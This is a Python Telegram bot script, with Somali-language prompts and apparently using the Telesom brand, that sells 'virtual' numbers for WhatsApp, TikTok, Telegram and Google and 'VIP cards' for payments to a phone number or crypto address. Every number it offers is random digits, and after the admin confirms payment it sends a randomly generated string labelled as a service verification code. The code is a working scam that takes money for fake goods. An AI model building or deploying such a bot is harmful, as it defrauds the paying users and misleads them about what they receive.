import os
import random
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters import Command

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ====== TEMP STORAGE ======
user_orders = {}
pending_otps = {}

# ====== NUMBER GENERATORS ======
def generate_virtual_number():
    return "063" + "".join(str(random.randint(0, 9)) for _ in range(7))

def generate_vip_number():
    return "06349" + "".join(str(random.randint(0, 9)) for _ in range(5))

# ====== START ======
@dp.message(Command("start"))
async def start_handler(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await message.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ====== VIRTUAL ======
@dp.callback_query(F.data == "virtual")
async def virtual_menu(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton(text="TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton(text="GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro adeeg:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp", "tiktok", "telegram", "google"]))
async def virtual_selected(call: CallbackQuery):
    service = call.data
    otp_message = await call.message.edit_text("OTP •")

    # animation wareegaya 5 sec
    for i in range(5):
        dots = "." * ((i % 3) + 1)
        await asyncio.sleep(1)
        await otp_message.edit_text(f"OTP{dots}")

    # keydi order
    number = generate_virtual_number()
    user_orders[call.from_user.id] = {
        "type": "Virtual",
        "service": service,
        "number": number,
        "price": "$1"
    }
    pending_otps[call.from_user.id] = True

    # sug 5 sec si admin u confirm
    await asyncio.sleep(5)
    if pending_otps.get(call.from_user.id):
        await call.message.answer("Please Send Money 💵")

# ====== CARD ======
@dp.callback_query(F.data == "card")
async def card_menu(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro nooca Card:", reply_markup=kb)

@dp.callback_query(F.data == "vip")
async def vip_selected(call: CallbackQuery):
    numbers = "\n".join(generate_vip_number() for _ in range(3))
    user_orders[call.from_user.id] = {
        "type": "VIP",
        "number": numbers,
        "price": "$15"
    }
    kb = payment_keyboard()
    await call.message.edit_text(
        f"VIP Numbers:\n{numbers}\n\nPLEASE SEND MONEY BEFORE\nAND GET YOUR VIP CARD 💵",
        reply_markup=kb
    )

@dp.callback_query(F.data == "normal")
async def normal_selected(call: CallbackQuery):
    number = generate_virtual_number()
    user_orders[call.from_user.id] = {
        "type": "Normal",
        "number": number,
        "price": "$1"
    }
    kb = payment_keyboard()
    await call.message.edit_text(
        f"Number-kaaga:\n{number}\n\nPLEASE SEND MONEY BEFORE\nAND GET YOUR NORMAL CARD 💵",
        reply_markup=kb
    )

# ====== PAYMENT ======
def payment_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL PAYMENT", callback_data="local")],
        [InlineKeyboardButton(text="CRYPTO CURRENCY", callback_data="crypto")]
    ])

@dp.callback_query(F.data == "local")
async def local_payment(call: CallbackQuery):
    await call.message.answer("Fadlan lacag ku dir:\n+252907868526")
    await send_admin_request(call.from_user.id)

@dp.callback_query(F.data == "crypto")
async def crypto_menu(call: CallbackQuery):
    await call.message.answer(
        "BNB Address:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "USDT-BEP20 Address:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`",
        parse_mode="Markdown"
    )
    await send_admin_request(call.from_user.id)

# ====== ADMIN REQUEST ======
async def send_admin_request(user_id):
    if user_id not in user_orders:
        return
    order = user_orders[user_id]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"confirm_{user_id}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{user_id}")],
        [InlineKeyboardButton(text="BAN", callback_data=f"ban_{user_id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"NEW ORDER\n\nUser ID: {user_id}\nType: {order['type']}\n"
        f"Number:\n{order['number']}\nPrice: {order['price']}",
        reply_markup=kb
    )

# ====== ADMIN ACTIONS ======
@dp.callback_query(F.data.startswith("confirm_"))
async def confirm_user(call: CallbackQuery):
    user_id = int(call.data.split("_")[1])
    if user_id in user_orders:
        order = user_orders[user_id]
        service = order.get("service", "virtual")
        code = "".join(random.choice("0123456789") for _ in range(6))
        if service == "whatsapp":
            final_code = f"WhatsApp Code: {code}-{random.randint(100,999)}"
        elif service == "telegram":
            final_code = f"Telegram Code: {code}"
        elif service == "google":
            final_code = f"Google Code: G-{code}"
        elif service == "tiktok":
            final_code = f"TikTok Code: TT{code}"
        else:
            final_code = f"Code: {code}"
        pending_otps[user_id] = False
        await bot.send_message(user_id, f"Payment Confirmed ✅\n\n{final_code}")
    await call.message.edit_text("Confirmed")

@dp.callback_query(F.data.startswith("reject_"))
async def reject_user(call: CallbackQuery):
    user_id = int(call.data.split("_")[1])
    await bot.send_message(user_id, "Payment Rejected ❌")
    await call.message.edit_text("Rejected")

@dp.callback_query(F.data.startswith("ban_"))
async def ban_user(call: CallbackQuery):
    user_id = int(call.data.split("_")[1])
    await bot.send_message(user_id, "You are Banned ❌")
    await call.message.edit_text("User Banned")

# ====== RUN ======
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
